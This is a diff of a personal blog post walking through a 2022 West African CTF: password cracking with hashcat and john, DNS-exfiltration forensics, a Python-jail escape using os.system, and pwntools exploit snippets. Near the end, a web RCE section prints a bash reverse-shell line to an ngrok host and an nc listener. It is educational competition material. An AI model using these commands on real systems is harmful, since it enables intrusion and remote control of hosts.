@@ -6,7 +6,7 @@ categories:
   - Hackerlab
 ---
 
-{{< image src="/hackerlab2022/hacklab.png" alt="Hackerlab" position="left" >}}
+{{< post-img src="hacklab.png" alt="hackerlab-2022" style="width:200px" >}}
 
 Ok so I was part of the hackerlab, a CTF (the only one?) hosted by my country.
 And this year they extended it to all the (16) countries of ECOWAS.
@@ -44,8 +44,8 @@ Same value as "Discord" challenge.
 In the details of their announcement video (on youtube) you can see some very obvious binary.
 
 ```
-00100001 00100001 00100001 00110010 00110011 00110110 00110001 00110001 00110010 
-00110110 00110010 00110111 01101001 01110100 00110000 01000111 00110001 
+00100001 00100001 00100001 00110010 00110011 00110110 00110001 00110001 00110010
+00110110 00110010 00110111 01101001 01110100 00110000 01000111 00110001
 01011111 01000110 01010100 01000011
 ```
 Just go to the [kitchen](https://gchq.github.io/) again, but this time be careful, there is two sauces to use.
@@ -56,14 +56,14 @@ Just go to the [kitchen](https://gchq.github.io/) again, but this time be carefu
 - status = solved
 
 This one was fun, because the name itself is a big hint, but the challenge was actually finding the javascript to deobfuscate.
-Took me way to much more time than needed but remember to check all the files, 
+Took me way to much more time than needed but remember to check all the files,
 even `awesome-fonts.js` (sometimes people hide things in css files too so...yeah).
 
 Use some google-fu to deobfuscate the jsfuck
 
 Add some clarity in their nonsenses
 
-```
+```js
 cipher = [67, 85, 68, 92, 55, 49, 51, 94, 90, 56, 109, 99, 59, 50, 63, 61, 35, 37]
 var f = ""
 function xor_xor(x, y) {
@@ -84,13 +84,13 @@ Decimal ascii code salsa aaaaand f*ck 'em!!
 - points = 20
 - status = solved
 
-You get an [encrypted pdf](/hackerlab2022/secret.pdf)
+You get an [encrypted pdf](secret.pdf)
 
 john (the ripper)? hashcat? well whatever suits your needs!
 
 I simply used `pdfcrack` lol
 
-```
+```bash
 └──╼ $pdfcrack -f secret.pdf -w /usr/share/wordlists/rockyou.txt
 PDF version 1.7
 Security Handler: Standard
@@ -123,9 +123,9 @@ back to the [kitchen](https://gchq.github.io/) to decode the hidden text. Big hi
 
 That's where I started to be stupid. The thing is...I was on the right track most of the times.
 
-I tried to bruteforce the [encrypted docx file](/hackerlab2022/secret.docx)
+I tried to bruteforce the [encrypted docx file](secret.docx)
 
-```
+```bash
 └──╼ $python2 /usr/share/john/office2john.py secret.docx > secret.txt
 └──╼ $cat secret.txt
 secret.docx:$office$*2013*100000*256*16*744b3976099...[REDACTED MAD LONG HASH]
@@ -137,9 +137,10 @@ Hashfile 'secret.txt' on line 1 (secret...8bcc10dca254a958b40b018d07ac5670): Sig
 No hashes loaded.
 
 ```
+
 Why didnt it work? format! hashcat doesnt recognize what john produced so remove the name
 
-```
+```bash
 └──╼ $cat secret.txt
 $office$*2013*100000*256*16*744b3976099d...[REDACTED MAD LONG HASH]
 ```
@@ -147,7 +148,7 @@ Started but took so damn long I started to think it wasn't about bruteforcing...
 
 Seems like I was wrong...It was! I Just needed to try harder! (or get a better computer)
 
-According to [those guys](https://github.com/TargetRoot/CTF) 
+According to [those guys](https://github.com/TargetRoot/CTF)
 `└──╼ $hashcat -a 0 -m 9600 hash.txt /usr/share/wordlists/rockyou.txt` was supposed to give me the password `H4cK3r`
 
 And just like for the secret pdf challenge there were hidden characters so SELECT EVERYTHING!
@@ -160,14 +161,14 @@ But what is the key?
 
 knowing the flag format is "CTF_whatever" using python to compare the characters xor indeed gives you the key
 
-```
+```bash
 python -c "for i,j in zip(list('CTF_'),list('DSAX')): print(ord(i)^ord(j))"
 ```
 Then simply decode it
-```
+```bash
 python3 -c "for i in 'DSAXC7D.86543Eur04&&': print(chr(ord(i)^7),end='')"
 ```
-But if you are not a clever scripter (no judging) just go to the 
+But if you are not a clever scripter (no judging) just go to the
 [kitchen](https://gchq.github.io/) and Bruteforce that XOR. You get the flag anyway you want.
 
 
@@ -176,7 +177,7 @@ But if you are not a clever scripter (no judging) just go to the
 - points = 50
 - status = unsolved
 
-{{< image src="/hackerlab2022/Amazone.jpeg" alt="amazone" position="center" style="width: 300px;" >}}
+{{< post-img src="amazone.jpeg" alt="amazone" style="width:400px" >}}
 
 Ok This one is steganography and my favorite one. But I didnt solve it!
 
@@ -200,11 +201,11 @@ With that you extract the flag directly!
 
 It's Reverse engineering...yes we all love those
 
-Decompile the [binary file](2022/ecowas_portal) with your favorite thing
+Decompile the [binary file](ecowas_portal) with your favorite thing
 
 I discovered [dogbolt](https://dogbolt.org/) doing this. It's a cool one as you get multiple decompilers at the same time
 
-You get interresting variables and an encryption function (r2 or ghidra)
+You get interesting variables and an encryption function (r2 or ghidra)
 
 Once you understand how it works you can easily write a script to reverse the encrypt method and get the flag
 
@@ -217,11 +218,11 @@ Once you understand how it works you can easily write a script to reverse the en
 
 I finally got my sh*t together and used some common sense.
 
-Download that [totally not suspicious text file](2022/hackerlab.txt)
+Download that [totally not suspicious text file](hackerlab.txt)
 
-```
+```bash
 └──╼ $file hackerlab.txt
-hackerlab.txt: UTF-8 Unicode text, with very long lines, with no line terminators 
+hackerlab.txt: UTF-8 Unicode text, with very long lines, with no line terminators
 ```
 I was confused a bit (`xxd` confirms) but A LOT of GOOGLE-FU solved this one
 
@@ -239,24 +240,25 @@ Also maybe [This](https://330k.github.io/misc_tools/unicode_steganography.html)
 
 ooh forensics...much detective...much suspense
 
-You get a [Capture file](2022/capture.pcap) so obviously you open wireshark and google "dns exfiltration"...then
-```
+You get a [Capture file](capture.pcap) so obviously you open wireshark and google "dns exfiltration"...then
+
+```bash
 └──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2" > output.txt
 ```
 and clean the junk out
 
-```
+```bash
 └──╼ $cat output.txt | sed 's/.hackerlab.africa//g' > clean_out.txt
 ```
 
-Or in one take: 
+Or in one take:
 `tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2" | sed 's/.hackerlab.africa//g' > output.txt`
 
 Now go to the kitchen (cyberchef)
 
 from hex and then png download...aaaand it's messed up
 
-```
+```bash
 └──╼ $binwalk output.dat
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
@@ -271,10 +273,10 @@ The file I got was messed because there is actually two files to extract and we 
 
 we need to separate by request types (CNAME = 5 and A = 1 )
 
-```
-└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2 && dns.qry.type==1" | sed 's/.hackerlab.africa//g' > output1.txt 
+```bash
+└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2 && dns.qry.type==1" | sed 's/.hackerlab.africa//g' > output1.txt
 
-└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2 && dns.qry.type==5" | sed 's/.hackerlab.africa//g' > output2.txt 
+└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2 && dns.qry.type==5" | sed 's/.hackerlab.africa//g' > output2.txt
 ```
 
 Now with two output files I go back to the kitchen and extract files from them separately
@@ -283,7 +285,7 @@ I got a clear png now that hints me to bruteforcing
 
 and a zlib/zip file?
 
-```
+```bash
 └──╼ $file flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w
 flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w: Zip archive data, at least v2.0 to extract
 
@@ -293,9 +295,9 @@ inflating: flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.
 ```
 Lol..when you unzip it inflates to a file with one less letter in the name
 
-this is gonna take years LMAO so let's automate this (srcipt it is) until...
+this is gonna take years LMAO so let's automate this (script it is) until...
 
-```
+```bash
 Archive:  flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a
 End-of-central-directory signature not found.  Either this file is not
 a zipfile, or it constitutes one disk of a multi-part archive.  In the
@@ -307,7 +309,7 @@ Now there is one that is not a zip?
 
 Delete all the needless junk and keep `flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a`
 
-```
+```bash
 └──╼ $file flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a
 flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: XZ compressed data
 ```
@@ -315,7 +317,8 @@ Obviously...(XD)
 
 the xs archives have a zip extension so `unxz` fails! rename to .xz then unxz several times (chunks are removed from file size) (rinse and repeat or automate ) Until...
 
-```└──╼ $mv flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a flag.xz && unxz flag.xz
+```bash
+└──╼ $mv flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a flag.xz && unxz flag.xz
 
 unxz : flag.xz: Format de fichier inconnu
 
@@ -325,28 +328,28 @@ flag.xz: bzip2 compressed data, block size = 900k
 
 LMAO! They just like to make people suffer! change the extraction method and...
 
-```
+```bash
 └──╼ $file flag
 flag: gzip compressed data, last modified: Tue Jul 26 19:46:33 2022, from Unix, original size modulo 2^32 939
 ```
-BACK TO GZIP??? CMOOOOOON...spam extract again (wtf??? lol) 
+BACK TO GZIP??? CMOOOOOON...spam extract again (wtf??? lol)
 
-```
+```bash
 └──╼ $mv flag flag.gz && gunzip flag.gz
 
 gzip: flag.gz: encrypted file -- use unzip
 ```
 FINALLY! Back to reality! unzip it and realise its now the PNG's hint serves
 
-```
-└──╼ $unzip flag.zip 
+```bash
+└──╼ $unzip flag.zip
 Archive:  flag.zip
-[flag.zip] flag.txt password: 
+[flag.zip] flag.txt password:
 
 ```
 Crack this sht
 
-```
+```bash
 └──╼ $zip2john flag.zip > zip_hash.txt
 ver 2.0 efh 5455 efh 7875 flag.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=330, decmplen=3403, crc=F6E944AC
 
@@ -367,7 +370,7 @@ Session completed
 
 ```
 
-Now the flag is a [QR code](Assets/flag.txt)
+Now the flag is a [QR code](flag.txt)
 
 scan it with anything you want (zbartools dont work with txt files so you can flameshot it first or whatever) anyway...ggwp
 
@@ -378,11 +381,11 @@ scan it with anything you want (zbartools dont work with txt files so you can fl
 
 I think I could do this one but I ran out of time...
 
-Anyway...get the archive, explore the files and notice the [main.py module](2022/main.py)
+Anyway...get the archive, explore the files and notice the [main.py module](main.py)
 
 It's RE so understand what it does and...well...reverse it
 
-[those guys](https://github.com/TargetRoot/CTF) wrote a nice [solution](2022/solve_breakme.py) that gives you a base32 encoded string (just like the hint said)
+[those guys](https://github.com/TargetRoot/CTF) wrote a nice [solution](solve_breakme.py) that gives you a base32 encoded string (just like the hint said)
 
 It's a pastebin link leading to a 3D obj file (made in blender)
 
@@ -396,12 +399,13 @@ Back to the [kitchen](https://gchq.github.io/) to get that flag
 - points = 300
 - status = unsolved
 
-Get the [Binary](2022/invisible)...It's pwn so you know what to do already
+Get the [Binary](invisible)...It's pwn so you know what to do already
 
 It's all about `ELF x64 - Format string bug`
 
-I might update this later with more details but as I didnt solve it I will simply reffer to [those guys](https://github.com/TargetRoot/CTF)'s solution using `pwntools` on remote
-```
+I might update this later with more details but as I didnt solve it I will simply refer to [those guys](https://github.com/TargetRoot/CTF)'s solution using `pwntools` on remote
+
+```python
 from pwn import *
 from time import sleep
 context.arch = 'amd64'
@@ -425,14 +429,14 @@ First google `python jail`
 
 Connect to the server
 
-```
+```bash
 └──╼ $nc 51.38.37.81 7002
 Please, save me from this hell :'(
->>> 
+>>>
 ```
 Checking if `sys` is present
 
-```
+```bash
 >>> print sys
 <module 'sys' (built-in)>
 
@@ -445,8 +449,8 @@ Checking if `sys` is present
 ```
 Os module allow code execution...so yeah
 
-```
->>> print sys.modules['os'].system('ls -al')               
+```bash
+>>> print sys.modules['os'].system('ls -al')
 total 28
 drwxr-x--- 1 root ecowas 4096 Aug  3 20:40 .
 drwxr-xr-x 1 root root   4096 Aug  3 22:51 ..
@@ -457,26 +461,26 @@ drwxr-xr-x 1 root root   4096 Aug  3 22:51 ..
 ```
 Lol this one is amazing
 
-```
+```bash
 >>> print sys.modules['os'].system('cat flag.txt')
 Check the source code0
 ```
 I knew It could not be over yet
 
-```
->>> print sys.modules['os'].system('cat chal.py') 
+```bash
+>>> print sys.modules['os'].system('cat chal.py')
 ...
 [REDACTED]
 ```
-I put the mad long output [here](2022/chal.py)
+I put the mad long output [here](chal.py)
 
 Big hints: `RSA cracking + hex string`
 
 Trust me..;alot of scripting is involved from here
 
-But to not be too verbose I once again reffer to [those awesome guys](https://github.com/TargetRoot/CTF) and their final payload
+But to not be too verbose I once again refer to [those awesome guys](https://github.com/TargetRoot/CTF) and their final payload
 
-```
+```python
 from pwn import *
 def f (param1):
 	local_10=1
@@ -516,7 +520,7 @@ I didnt do it so still according to [my G's](https://github.com/TargetRoot/CTF)
 
 It was straightforward RCE but...for RCE you might need a VPS (idk If ngrok)
 
-```
+```bash
 └──╼ $pip3 install pyftpdlib
 
 └──╼ $echo 'bash -i >& /dev/tcp/tcp://6.tcp.ngrok.io:16211/4444 0>&1' > shell
@@ -550,12 +554,12 @@ bash: ?user_inputs[0]=e : commande introuvable
 [8]-  Fini                    user_inputs[1]=a%0a
 [9]+  Fini                    user_inputs[2]=bash
 ```
-In the paylaod `...[4]=51383781...` Is the target IP without the dots (avoid preg_match)
+In the payload `...[4]=51383781...` Is the target IP without the dots (avoid preg_match)
 
 
-Before running the last command I had my listenner up
+Before running the last command I had my listener up
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35042
@@ -568,8 +572,7 @@ You just get the flag after this one
 
 ## END OF THE LINE!
 
-{{< image src="/hackerlab2022/scores.png" alt="my-scores" position="center" style="width: 300px;" >}}
-
+{{< post-img src="scores.png" alt="my-score" style="width:500px" >}}
 
 That was an awesome experience, even though I joined late, I had alot of fun and most importantly learnt alot!
 
